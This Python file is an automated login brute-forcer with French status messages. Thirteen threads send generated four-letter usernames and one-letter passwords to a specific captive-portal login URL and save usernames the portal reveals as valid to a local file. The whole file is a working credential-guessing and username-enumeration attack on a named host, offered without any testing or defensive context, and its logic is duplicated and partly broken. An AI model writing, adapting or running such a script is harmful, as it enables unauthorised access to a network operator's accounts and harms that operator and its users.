import requests
import time
import threading
last=0
dema=" demarrage de la machine virtuel ..."
for new in dema:
    time.sleep(1)
    print(new,end="")
def crack():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=1
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack2():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=2
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack3():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=4
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack4():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=6
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack5():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=8
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack6():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=10
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack7():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=12
    y,z,u=0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack8():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=14
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack9():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=16
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack10():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=18
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack11():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=20
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack12():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=22
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")
def crack13():
    t1=time.time()
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=24
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion perdu, reconnexion...",end="\r")
        t2=time.time()
        t3=int((1/(t2-t1))*14)
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write("login : "+user)
            fd.close()
        else :
            print("login {} incorrect ||  {}  login/sec ".format(user,t3),end="\r")

t1=threading.Thread(target=crack)
t2=threading.Thread(target=crack2)
t3=threading.Thread(target=crack3)
t4=threading.Thread(target=crack4)
t5=threading.Thread(target=crack5)
t6=threading.Thread(target=crack6)
t7=threading.Thread(target=crack7)
t8=threading.Thread(target=crack8)
t9=threading.Thread(target=crack9)
t10=threading.Thread(target=crack10)
t11=threading.Thread(target=crack11)
t12=threading.Thread(target=crack12)
t13=threading.Thread(target=crack13)
t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
t9.start()
t10.start()
t11.start()
t12.start()
t13.start()
t1.join()
t2.join()
t3.join()
t4.join()
t5.join()
t6.join()
t7.join()
t8.join()
t9.join()
t10.join()
t11.join()
t12.join()
t13.join()
